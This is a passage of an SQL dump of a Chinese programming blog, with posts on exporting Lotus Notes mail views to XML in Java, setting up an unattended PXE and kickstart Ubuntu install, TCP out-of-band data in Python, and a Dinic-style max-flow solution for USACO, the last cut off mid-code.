/>&nbsp;&nbsp;&nbsp;&nbsp;inbox = (View)db.getViews().get(viewIndex);<br />&nbsp;&nbsp;&nbsp;else<br />&nbsp;&nbsp;&nbsp;&nbsp;return false;<br />&nbsp;&nbsp;&nbsp;System.out.println(\"INFO:&nbsp; view got\");<br />&nbsp;&nbsp;}<br />&nbsp;&nbsp;catch(Exception e){<br />&nbsp;&nbsp;&nbsp;e.printStackTrace();<br />&nbsp;&nbsp;&nbsp;return false;<br />&nbsp;&nbsp;}<br />&nbsp;&nbsp;return true;<br />&nbsp;}<br />&nbsp;/**<br />&nbsp; * Setter and getter<br />&nbsp; * @return<br />&nbsp; */<br />&nbsp;public String getViewName() {<br />&nbsp;&nbsp;return viewName;<br />&nbsp;}<br />&nbsp;public void setViewName(String viewName) {<br />&nbsp;&nbsp;this.viewName = viewName;<br />&nbsp;}<br />&nbsp;public int getViewIndex() {<br />&nbsp;&nbsp;return viewIndex;<br />&nbsp;}<br />&nbsp;public void setViewIndex(int viewIndex) {<br />&nbsp;&nbsp;this.viewIndex = viewIndex;<br />&nbsp;}<br />&nbsp;public int getViewType() {<br />&nbsp;&nbsp;return viewType;<br />&nbsp;}<br />&nbsp;public void setViewType(int viewType) {<br />&nbsp;&nbsp;this.viewType = viewType;<br />&nbsp;}<br />&nbsp;public String getDbName() {<br />&nbsp;&nbsp;return dbName;<br />&nbsp;}<br />&nbsp;public void setDbName(String dbName) {<br />&nbsp;&nbsp;this.dbName = dbName;<br />&nbsp;}<br />&nbsp;public String getXmlPath() {<br />&nbsp;&nbsp;return xmlPath;<br />&nbsp;}<br />&nbsp;public void setXmlPath(String xmlPath) {<br />&nbsp;&nbsp;this.xmlPath = xmlPath;<br />&nbsp;&nbsp;File path = new File(xmlPath);<br />&nbsp;&nbsp;if(!path.exists())<br />&nbsp;&nbsp;&nbsp;path.mkdir();<br />&nbsp;}<br />}<br /></p>',1,1,1,0,0,0,'需要设置的属性有\n1：数据库文件的名字（放在Notes的默认数据库目录下，如C:\\notes\\data）\n2：要转换的View（邮件的收件箱和发件箱分别为$Inbox和$Sent）\n3：转换生成的xml文件存放路径（以\\\\结束，如D:\\\\data\\\\）\n注：Lotus Notes7下测试通过\npackage hjz;\nimport java.io.File;import java.util.List;import java.util.Vector;\nimport lotus.domino.Database;import lotus.domino.Document;import lotus.domino.DxlExporter;import lotus.domino.Item;import lotus.domino.NotesFactory;import lotus.domino.NotesThread;import lotus.domino.Session;import lotus.domino.Stream;import lotus.domino.View;/**&nbsp;* Convert Notes DB to xml&nbsp;* @author hankjin&nbsp;* this method can convert notes db to xml files&nbsp;*/public class Notes2Xml {&nbsp;public static final int TYPE_VIEWNAME = 1;&nbsp;public static final int TYPE_VIEWINDEX = 2;&nbsp;//Notes related variable&nbsp;Session s;&nbsp;Database db;&nbsp;View inbox;&nbsp;DxlExporter dxl;&nbsp;&nbsp;//special variable&nbsp;String dbName;&nbsp;String xmlPath;&nbsp;String viewName;&nbsp;int viewIndex;&nbsp;int viewType;&nbsp;&nbsp;public Notes2Xml(){&nbsp;&nbsp;&nbsp;}&nbsp;/**&nbsp; * @param args&nbsp; */&nbsp;public static void main(String[] args) throws Exception{&nbsp;&nbsp;// TODO Auto-generated method stub&nbsp;&nbsp;Notes2Xml tool = new Notes2Xml();&nbsp;&nbsp;tool.setDbName(\"hjz_test.nsf\");&nbsp;&nbsp;tool.setXmlPath(\"D:\\\\data\\\\\");&nbsp;&nbsp;tool.setViewType(Notes2Xml.TYPE_VIEWINDEX);&nbsp;&nbsp;tool.setViewIndex(0);&nbsp;&nbsp;tool.view2Xml();&nbsp;}&nbsp;/**&nbsp; * Convert a view 2 xml&nbsp; * @throws Exception&nbsp; */&nbsp;public void view2Xml() throws Exception{&nbsp;&nbsp;if(getInbox()){&nbsp;&nbsp;&nbsp;dxl = s.createDxlExporter();&nbsp;&nbsp;&nbsp;dxl.setForceNoteFormat(false);&nbsp;&nbsp;&nbsp;dxl.setOutputDOCTYPE(false);&nbsp;&nbsp;&nbsp;dxl.setConvertNotesBitmapsToGIF(true);&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;List&lt;Document&gt; docs = new Vector&lt;Document&gt;();&nbsp;&nbsp;&nbsp;Document doc = inbox.getFirstDocument();\n&nbsp;&nbsp;&nbsp;int count = 0;&nbsp;&nbsp;&nbsp;do{&nbsp;&nbsp;&nbsp;&nbsp;docs.add(doc);&nbsp;&nbsp;&nbsp;}while((doc = inbox.getNextDocument(doc)) != null);&nbsp;&nbsp;&nbsp;for(Document xml : docs){&nbsp;&nbsp;&nbsp;&nbsp;if(doc2Xml(xml, ++count) == false){&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;System.out.println(\"Failed:\"+count);&nbsp;&nbsp;&nbsp;&nbsp;}&nbsp;&nbsp;&nbsp;}&nbsp;&nbsp;}&nbsp;}&nbsp;/**&nbsp; * convert a document to xml&nbsp; * @param doc&nbsp; * @param index&nbsp; * @return&nbsp; */&nbsp;public boolean doc2Xml(Document doc, int index){&nbsp;&nbsp;try{&nbsp;&nbsp;&nbsp;String subject = doc.getItemValueString(\"Subject\");&nbsp;&nbsp;&nbsp;subject = subject.replaceAll(\"[/|:|*|?|\\\"|&lt;|&gt;|.|\\r|\\n]\", \"_\");&nbsp;&nbsp;&nbsp;if(subject.length() &gt; 200){&nbsp;&nbsp;&nbsp;&nbsp;subject = subject.substring(0, 200);&nbsp;&nbsp;&nbsp;}&nbsp;&nbsp;&nbsp;System.out.println(index + subject);&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Stream stream = s.createStream();&nbsp;&nbsp;&nbsp;if(stream.open(xmlPath + index + \"_\" + subject + \".xml\")){&nbsp;&nbsp;&nbsp;&nbsp;stream.writeText(dxl.exportDxl(doc));&nbsp;&nbsp;&nbsp;&nbsp;stream.close();&nbsp;&nbsp;&nbsp;}&nbsp;&nbsp;&nbsp;return true;&nbsp;&nbsp;}&nbsp;&nbsp;catch(Exception ioe){&nbsp;&nbsp;&nbsp;ioe.printStackTrace();&nbsp;&nbsp;&nbsp;return false;&nbsp;&nbsp;}&nbsp;}&nbsp;/**&nbsp; * List all views in the database.&nbsp; */&nbsp;public void listView() throws Exception{&nbsp;&nbsp;System.out.println(\"==================Views==============\");&nbsp;&nbsp;&nbsp;&nbsp;Vector&lt;View&gt; views = db.getViews();&nbsp;&nbsp;for(View view : views){&nbsp;&nbsp;&nbsp;System.out.println(view.getName());&nbsp;&nbsp;&nbsp;byte []tmp = view.getName().getBytes();&nbsp;&nbsp;&nbsp;for(int j = 0; j &lt; tmp.length; j ++){&nbsp;&nbsp;&nbsp;&nbsp;System.out.print(tmp[j]);&nbsp;&nbsp;&nbsp;}&nbsp;&nbsp;&nbsp;System.out.println();&nbsp;&nbsp;}&nbsp;&nbsp;System.out.println(\"=================End Views==============\");&nbsp;}&nbsp;/**&nbsp; * list all columns of a document &nbsp; * @param doc&nbsp; * @throws Exception&nbsp; */&nbsp;public void listColumns(Document doc)throws Exception{&nbsp;&nbsp;//items: Form, SendTo,CopyTo,From,Subject,DeliveryPriority&nbsp;&nbsp;List&lt;Item&gt; items = doc.getItems();&nbsp;&nbsp;for(Item item : items ){&nbsp;&nbsp;&nbsp;System.out.print(item.getName());&nbsp;&nbsp;&nbsp;String temp = doc.getItemValue(item.getName()).toString();&nbsp;&nbsp;&nbsp;System.out.println(temp);&nbsp;&nbsp;}&nbsp;&nbsp;System.out.println(doc.getEmbeddedObjects());&nbsp;}&nbsp;private boolean getInbox(){&nbsp;&nbsp;System.out.println(\"INFO: begin get inbox\");&nbsp;&nbsp;NotesThread.sinitThread(); // start thread&nbsp;&nbsp;try{&nbsp;&nbsp;&nbsp;s = NotesFactory.createSession();&nbsp;&nbsp;&nbsp;System.out.println(\"INFO:&nbsp; session got\");&nbsp;&nbsp;&nbsp;db = s.getDatabase(s.getServerName(),dbName);&nbsp;&nbsp;&nbsp;System.out.println(\"INFO:&nbsp; db got\");&nbsp;&nbsp;&nbsp;if(viewType == TYPE_VIEWNAME)&nbsp;&nbsp;&nbsp;&nbsp;inbox = db.getView(viewName);&nbsp;&nbsp;&nbsp;else if(viewType == TYPE_VIEWINDEX)&nbsp;&nbsp;&nbsp;&nbsp;inbox = (View)db.getViews().get(viewIndex);&nbsp;&nbsp;&nbsp;else&nbsp;&nbsp;&nbsp;&nbsp;return false;&nbsp;&nbsp;&nbsp;System.out.println(\"INFO:&nbsp; view got\");&nbsp;&nbsp;}&nbsp;&nbsp;catch(Exception e){&nbsp;&nbsp;&nbsp;e.printStackTrace();&nbsp;&nbsp;&nbsp;return false;&nbsp;&nbsp;}&nbsp;&nbsp;return true;&nbsp;}&nbsp;/**&nbsp; * Setter and getter&nbsp; * @return&nbsp; */&nbsp;public String getViewName() {&nbsp;&nbsp;return viewName;&nbsp;}&nbsp;public void setViewName(String viewName) {&nbsp;&nbsp;this.viewName = viewName;&nbsp;}&nbsp;public int getViewIndex() {&nbsp;&nbsp;return viewIndex;&nbsp;}&nbsp;public void setViewIndex(int viewIndex) {&nbsp;&nbsp;this.viewIndex = viewIndex;&nbsp;}&nbsp;public int getViewType() {&nbsp;&nbsp;return viewType;&nbsp;}&nbsp;public void setViewType(int viewType) {&nbsp;&nbsp;this.viewType = viewType;&nbsp;}&nbsp;public String getDbName() {&nbsp;&nbsp;return dbName;&nbsp;}&nbsp;public void setDbName(String dbName) {&nbsp;&nbsp;this.dbName = dbName;&nbsp;}&nbsp;public String getXmlPath() {&nbsp;&nbsp;return xmlPath;&nbsp;}&nbsp;public void setXmlPath(String xmlPath) {&nbsp;&nbsp;this.xmlPath = xmlPath;&nbsp;&nbsp;File path = new File(xmlPath);&nbsp;&nbsp;if(!path.exists())&nbsp;&nbsp;&nbsp;path.mkdir();&nbsp;}}','',0,'other',0,'','zinnia/_entry_detail.html','entry_detail.html'),(357,'PXE无人值守Ubuntu全自动网络安装','3373193720094214277715',2,'2009-05-21 16:27:07',NULL,'2009-05-21 16:27:07','2014-07-13 18:57:26','1. 搭建mirror<br />1.1 首先安装启动apache服务器 <br />sudo apt-get install apache2<br />1.2 挂载安装文件镜像<br />sudo mkdir /var/www/ubuntu<br />sudo mount -o loop ubuntu-server-8.04.2-i386.iso /var/www/ubuntu<br /><br />2. 搭建PXE服务器<br />2.1 搭建dhcp服务器<br />sudo apt-get install dhcp3-server<br />sudo vi /etc/default/dhcp3-server<br />INTERFACES=\"<span style=\"color: rgb(255, 0, 0);\">eth0</span>\"<br />sudo vi /etc/dhcp3/dhcpd.conf<br />option routers 192.168.1.111;\n<div>option domain-name-servers 202.114.0.242;</div>\n<div>&nbsp;</div>\n<div>subnet 192.168.1.0 netmask 255.255.255.0 {</div>\n<div>&nbsp;&nbsp;range dynamic-bootp 192.168.1.2 192.168.1.29;</div>\n<div>&nbsp;&nbsp;filename \"pxelinux.0\";</div>\n<div>}</div>\n<div>&nbsp;</div>\n<div>host pxeinstall {</div>\n<div>&nbsp;&nbsp;hardware ethernet [MAC 00:0A:E4:2E:A6:42;</div>\n<div>&nbsp;&nbsp;fixed-address 192.168.1.8;</div>\n<div>&nbsp;&nbsp;filename \"pxelinux.0\";</div>\n<div>}</div>sudo /etc/init.d/dhcp3-server start<br />2.2 搭建tftp服务器<br />sudo apt-get install tftpd-hpa<br />sudo update-inetd --enable BOOT<br />sudo vi /etc/default/tftpd-hpa<br />RUN_DAEMON=\"<span style=\"color: rgb(255, 0, 0);\">yes</span>\"<br />sudo /etc/init.d/tftpd-hpa start<br />2.3 配置PXE<br />cp -a /var/www/ubuntu/install/netboot/* /var/lib/tftpboot/<br />#创建链接<br />ifconfig #例如查到的mac地址是00:0A:E4:2E:A6:42<br />lns -s /var/lib/tftpboot/pxelinux.cfg/default /var/lib/tftpboot/pxelinux.cfg/000AE42EA642<br /><br />3. 创建kickstart脚本<br />3.1 创建ks.cfg <br />sudo apt-get install system-config-kickstart<br />system-config-kickstart<br />保存为/var/www/ks.cfg<br />3.2 在PXE启动菜单中指定kickstart文件<br />修改/var/lib/tftpboot/pxelinux.cfg/default<br />增加一个启动项<br />LABEL auto<br />&nbsp;&nbsp;&nbsp; kernel ubuntu-installer/i386/linux<br />&nbsp;&nbsp;&nbsp; append ks=http://192.201.0.111/ks.cfg vga=normal initrd=ubuntu-installer/i386/initrd.gz --<br /><br />4. 客户端BIOS启动时选择PXE网络启动，然后在启动界面输入auto，然后按回车，系统会根据ks.cfg的配置自动分区，自动配置网络，自动设置用户，若干分钟后，显示登录提示符，用户名cbib 密码cbib<br /><br />一个示例kickstart配置文件:<br /><font face=\"monospace\">#example: ks.cfg</font>\n<div><font face=\"monospace\">#Generated by Kickstart Configurator<br />#platform=x86<br /><br />#System language<br />lang en_US<br />#Language modules to install<br />langsupport en_US<br />#System keyboard<br />keyboard us<br />#System mouse<br />mouse<br />#System timezone<br />timezone --utc America/New_York<br />#Root password<br />rootpw --disabled<br />#Initial user, username: cbib password: cbib<br />user cbib --fullname \"cbib\" --iscrypted --password $1$Fcf/xwwE$aHXt6SEkPGVuxPT7cwKNa.<br />#Reboot after installation<br />reboot<br />#Use text mode install<br />text<br />#Install OS instead of upgrade<br />install<br />#Use Web installation<br />url --url <span style=\"color: rgb(255, 0, 0);\">http://192.201.0.111/ubuntu</span><br />#System bootloader configuration<br />bootloader --location=mbr<br />#Clear the Master Boot Record<br />zerombr yes<br />#Partition clearing information<br /><span style=\"color: rgb(255, 0, 0);\">clearpart --all --initlabel</span><br />#Disk partitioning information<br />part /boot --fstype ext2 --size 150<br />part swap --recommended<br />part / --fstype ext3 --size 1 --grow<br />#System authorization infomation<br />auth &nbsp;--useshadow &nbsp;--enablemd5<br />#Network information<br />network --bootproto=static --ip=<span style=\"color: rgb(255, 0, 0);\">192.201.0.7 --netmask=255.255.255.0 --gateway=192.201.0.253 --nameserver=202.114.215.73</span> --device=eth0<br />#Firewall configuration<br />firewall --disabled<br />#Do not configure the X Window System<br />skipx</font></div><br />',1,1,1,0,0,0,'1. 搭建mirror1.1 首先安装启动apache服务器 sudo apt-get install apache21.2 挂载安装文件镜像sudo mkdir /var/www/ubuntusudo mount -o loop ubuntu-server-8.04.2-i386.iso /var/www/ubuntu2. 搭建PXE服务器2.1 搭建dhcp服务器sudo apt-get install dhcp3-serversudo vi /etc/default/dhcp3-serverINTERFACES=\"eth0\"sudo vi /etc/dhcp3/dhcpd.confoption routers 192.168.1.111;\noption domain-name-servers 202.114.0.242;\n&nbsp;\nsubnet 192.168.1.0 netmask 255.255.255.0 {\n&nbsp;&nbsp;range dynamic-bootp 192.168.1.2 192.168.1.29;\n&nbsp;&nbsp;filename \"pxelinux.0\";\n}\n&nbsp;\nhost pxeinstall {\n&nbsp;&nbsp;hardware ethernet [MAC 00:0A:E4:2E:A6:42;\n&nbsp;&nbsp;fixed-address 192.168.1.8;\n&nbsp;&nbsp;filename \"pxelinux.0\";\n}sudo /etc/init.d/dhcp3-server start2.2 搭建tftp服务器sudo apt-get install tftpd-hpasudo update-inetd --enable BOOTsudo vi /etc/default/tftpd-hpaRUN_DAEMON=\"yes\"sudo /etc/init.d/tftpd-hpa start2.3 配置PXEcp -a /var/www/ubuntu/install/netboot/* /var/lib/tftpboot/#创建链接ifconfig #例如查到的mac地址是00:0A:E4:2E:A6:42lns -s /var/lib/tftpboot/pxelinux.cfg/default /var/lib/tftpboot/pxelinux.cfg/000AE42EA6423. 创建kickstart脚本3.1 创建ks.cfg sudo apt-get install system-config-kickstartsystem-config-kickstart保存为/var/www/ks.cfg3.2 在PXE启动菜单中指定kickstart文件修改/var/lib/tftpboot/pxelinux.cfg/default增加一个启动项LABEL auto&nbsp;&nbsp;&nbsp; kernel ubuntu-installer/i386/linux&nbsp;&nbsp;&nbsp; append ks=http://192.201.0.111/ks.cfg vga=normal initrd=ubuntu-installer/i386/initrd.gz --4. 客户端BIOS启动时选择PXE网络启动，然后在启动界面输入auto，然后按回车，系统会根据ks.cfg的配置自动分区，自动配置网络，自动设置用户，若干分钟后，显示登录提示符，用户名cbib 密码cbib一个示例kickstart配置文件:#example: ks.cfg\n#Generated by Kickstart Configurator#platform=x86#System languagelang en_US#Language modules to installlangsupport en_US#System keyboardkeyboard us#System mousemouse#System timezonetimezone --utc America/New_York#Root passwordrootpw --disabled#Initial user, username: cbib password: cbibuser cbib --fullname \"cbib\" --iscrypted --password $1$Fcf/xwwE$aHXt6SEkPGVuxPT7cwKNa.#Reboot after installationreboot#Use text mode installtext#Install OS instead of upgradeinstall#Use Web installationurl --url http://192.201.0.111/ubuntu#System bootloader configurationbootloader --location=mbr#Clear the Master Boot Recordzerombr yes#Partition clearing informationclearpart --all --initlabel#Disk partitioning informationpart /boot --fstype ext2 --size 150part swap --recommendedpart / --fstype ext3 --size 1 --grow#System authorization infomationauth &nbsp;--useshadow &nbsp;--enablemd5#Network informationnetwork --bootproto=static --ip=192.201.0.7 --netmask=255.255.255.0 --gateway=192.201.0.253 --nameserver=202.114.215.73 --device=eth0#Firewall configurationfirewall --disabled#Do not configure the X Window Systemskipx','',0,'unix',0,'','zinnia/_entry_detail.html','entry_detail.html'),(358,'TCP发送带外数据MSG_OOB SIGURG','3373193720109204212231',2,'2010-10-02 01:00:20',NULL,'2010-10-02 01:00:20','2014-07-13 18:57:26','TCP是可靠连接，所以要发送数据的要依序发送，连接出问题后也要一定的时间才能检测出来。<br />好比三国杀，断线后一会儿才能发现，还要手工重新连接。<br />如果使用带外数据，就可以定时检测数据连接，发现断开后自动重新连接<br /><br />带外数据以signal的方式进行处理，不影响正常TCP通信。<br /><br />服务端：<br />from socket import *<br />import os,signal,fcntl<br />s=socket(AF_INET,SOCK_STREAM)<br />s.bind((\'0.0.0.0\',5555))<br />s.listen(20)<br />c,a=s.accept()<br />def sig_urg(fr,signo):<br />&nbsp; x=c.recv(20,MSG_OOB)<br />&nbsp; print x<br /><br />signal.signal(signal.SIGURG, sig_urg)<br />fcntl.fcntl(c.fileno(), fcntl.F_SETOWN, os.getpid())<br /><br /><br />\n客户端：<br />from socket import *<br />s=socket(AF_INET,SOCK_STREAM)<br />s.connect((\'127.0.0.1\',5555))<br />s.send(\'hello\', MSG_OOB)',1,1,1,0,0,0,'TCP是可靠连接，所以要发送数据的要依序发送，连接出问题后也要一定的时间才能检测出来。好比三国杀，断线后一会儿才能发现，还要手工重新连接。如果使用带外数据，就可以定时检测数据连接，发现断开后自动重新连接带外数据以signal的方式进行处理，不影响正常TCP通信。服务端：from socket import *import os,signal,fcntls=socket(AF_INET,SOCK_STREAM)s.bind((\'0.0.0.0\',5555))s.listen(20)c,a=s.accept()def sig_urg(fr,signo):&nbsp; x=c.recv(20,MSG_OOB)&nbsp; print xsignal.signal(signal.SIGURG, sig_urg)fcntl.fcntl(c.fileno(), fcntl.F_SETOWN, os.getpid())\n客户端：from socket import *s=socket(AF_INET,SOCK_STREAM)s.connect((\'127.0.0.1\',5555))s.send(\'hello\', MSG_OOB)','',0,'develop',0,'','zinnia/_entry_detail.html','entry_detail.html'),(359,'解决网络最大流问题USACO4.2.1的Dinic算法','33731937201062103115412',2,'2010-07-02 10:31:15',NULL,'2010-07-02 10:31:15','2014-07-13 18:57:26','解决网络最大流问题的算法很多，Dinic 是其中比较快的算法之一，虽然传说中ISAP是最快的，但是用Dinic求解USACO的4.2.1已经足够了<br />USACO 上提供的网编流算法思想是，找一个增广路径，然后增广流量，直到没有增广路径为止。<br />这是有两个问题：什么是增广路径？什么叫增广流量？<br />增广路径：就是从源点到终点的一条路径<br />增广流量：首先找到增广路径上的最小流x，然后对增广路径上的每条边，减去x，并反向增加x<br />如: 源点1，终点8。1-&gt;3流为20, 3-&gt;5流为10, 5-&gt;8流为30，则最小流为10，1-&gt;3变为20-10，3-&gt;5变为10-10，5-&gt;8变为30-10，3-&gt;1的流量增加10，5-&gt;3的流量增加10，8-&gt;5的流量增加10<br />算法流程为<br />maxflow = 0<br />while 有增广路径<br />&nbsp; maxflow += 最小流<br />&nbsp; 沿增广路径 增广流量<br />增广流量很简单，就是简单地修改图的边的，因此，主要的问题就是如何找增广路径。<br />最简单的办法是直接DFS，在USACO上可以过6个测试点，如果改用邻接表存储图的边，则可以过7个测试点，如果在增广流量的时候把流量为0的路径从邻接表中去除，就可以过8个测试点。要想过下面的4个测试点，就要优化了。<br />瓶颈在DFS上，当然就要用BFS优化，但是BFS的空间复杂度太高，因此采用BFS和DFS结合的方法，先用BFS对每个点标号，然后根据标号进行DFS。<br />如何标号：将源点S标为0，S的邻接点标为1，S的邻接点的未标号的邻接点标为2，...用BFS实现这个很简单<br />如何根据标号进行DFS：只有比该接点的标号多1的邻接点，才递归DFS，否则跳过。<br />附上程序：<br />/*<br />ID: hankjin1<br />LANG: C++<br />TASK: ditch<br />*/<br />#include &lt;iostream&gt;<br />#include &lt;fstream&gt;<br />#include &lt;algorithm&gt;<br />using namespace std;<br /><br />//note: TLE of test 8 if no 0 dist path removed<br />//note: TLE of test 9<br />int N,M;<br />int ditch[201][201];<br />int path[201][201];<br /><br />bool used[201];<br />int seq[201];<br />int bestseq[201];<br />int minV;<br />inline void add(int from, int to, int v){<br />&nbsp;&nbsp;&nbsp; if(ditch[from][to]==0){<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; path[from][ ++path[from][0] ] = to;<br />&nbsp;&nbsp;&nbsp; }<br />&nbsp;&nbsp;&nbsp; ditch[from][to]+=v;<br />}<br />inline void rm(int from, int to, int v){<br />&nbsp;&nbsp;&nbsp; ditch[from][to]-=v;<br />&nbsp;&nbsp;&nbsp; if(ditch[from][to]==0){<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; for(int i=1;i&lt;=path[from][0];i++){<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if(path[from][i]==to){<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; path[from][i]=path[from][ path[from][0] ];<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; break;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; path[from][0]--;<br />&nbsp;&nbsp;&nbsp; }<br />}<br />int dfs(int point, int x){<br />&nbsp;&nbsp;&nbsp; seq[x]=point;<br />&nbsp;&nbsp;&nbsp; used[point]=true;<br />&nbsp;&nbsp;&nbsp; for(int i=1; i&lt;=path[point][0];i++){<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; int j = path[point][i];<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if(!used[j]){<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if(j == M){<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; seq[x+1]=M;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return ditch[point][j];<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; int res = dfs(j, x+1);<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if(res &gt; 0)<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return min(ditch[point][j], res);<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br />&nbsp;&nbsp;&nbsp; }<br />&nbsp;&nbsp;&nbsp; used[point]=false;<br />&nbsp;&nbsp;&nbsp; return 0;<br />}<br />int solve(){<br />&nbsp;&nbsp;&nbsp; int total = 0;<br />&nbsp;&nbsp;&nbsp; while(true){<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; fill_n(seq, M+1, 0);<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; fill_n(used, M+1, false);<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; int v = dfs(1, 1);//find max path<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if(v == 0)<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; break;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; total += v;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; for(int i=1; seq[i]!=M;i++){<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; rm(seq[i], seq[i+1], v);<br />//&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ditch[seq[i]][seq[i+1]] -= v;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; add(seq[i+1], seq[i], v);<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br />&nbsp;&nbsp;&nbsp; }<br />&nbsp;&nbsp;&nbsp; return total;<br />}<br />int main(){<br />&nbsp;&nbsp;&nbsp; ifstream fin(\"ditch.in\");<br />&nbsp;&nbsp;&nbsp; ofstream fout(\"ditch.out\");<br />&nbsp;&nbsp;&nbsp; fin&gt;&gt;N&gt;&gt;M;<br />&nbsp;&nbsp;&nbsp; int a,b,c;<br />&nbsp;&nbsp;&nbsp; for(int i=0;i&lt;N;i++){<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; fin&gt;&gt;a&gt;&gt;b&gt;&gt;c;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; add(a,b,c);<br />&nbsp;&nbsp;&nbsp; }<br />&nbsp;&nbsp;&nbsp; fout&lt;&lt;solve()&lt;&lt;endl;<br />&nbsp;&nbsp;&nbsp; return 0;<br />}',1,1,1,0,0,0,'解决网络最大流问题的算法很多，Dinic 是其中比较快的算法之一，虽然传说中ISAP是最快的，但是用Dinic求解USACO的4.2.1已经足够了USACO 上提供的网编流算法思想是，找一个增广路径，然后增广流量，直到没有增广路径为止。这是有两个问题：什么是增广路径？什么叫增广流量？增广路径：就是从源点到终点的一条路径增广流量：首先找到增广路径上的最小流x，然后对增广路径上的每条边，减去x，并反向增加x如: 源点1，终点8。1-&gt;3流为20, 3-&gt;5流为10, 5-&gt;8流为30，则最小流为10，1-&gt;3变为20-10，3-&gt;5变为10-10，5-&gt;8变为30-10，3-&gt;1的流量增加10，5-&gt;3的流量增加10，8-&gt;5的流量增加10算法流程为maxflow = 0while 有增广路径&nbsp; maxflow += 最小流&nbsp; 沿增广路径 增广流量增广流量很简单，就是简单地修改图的边的，因此，主要的问题就是如何找增广路径。最简单的办法是直接DFS，在USACO上可以过6个测试点，如果改用邻接表存储图的边，则可以过7个测试点，如果在增广流量的时候把流量为0的路径从邻接表中去除，就可以过8个测试点。要想过下面的4个测试点，就要优化了。瓶颈在DFS上，当然就要用BFS优化，但是BFS的空间复杂度太高，因此采用BFS和DFS结合的方法，先用BFS对每个点标号，然后根据标号进行DFS。如何标号：将源点S标为0，S的邻接点标为1，S的邻接点的未标号的邻接点标为2，...用BFS实现这个很简单如何根据标号进行DFS：只有比该接点的标号多1的邻接点，才递归DFS，否则跳过。附上程序：/*ID: hankjin1LANG: C++TASK: ditch*/#include &lt;iostream&gt;#include &lt;fstream&gt;#include &lt;algorithm&gt;using namespace std;//note: TLE of test 8 if no 0 dist path removed//note: TLE of test 9int N,M;int ditch[201][201];int path[201][201];bool used[201];int seq[201];int bestseq[201];int minV;inline void add(int from, int to, int v){&nbsp;&nbsp;&nbsp; if(ditch[from][to]==0){&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; path[from][ ++path[from][0] ] = to;&nbsp;&nbsp;&nbsp; }&nbsp;&nbsp;&nbsp; ditch[from][to]+=v;}inline void rm(int from, int to, int v){&nbsp;&nbsp;&nbsp; ditch[from][to]-=v;&nbsp;&nbsp;&nbsp; if(ditch[from][to]==0){&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; for(int i=1;i&lt;=path[from][0];i++){&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if(path[from][i]==to){&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 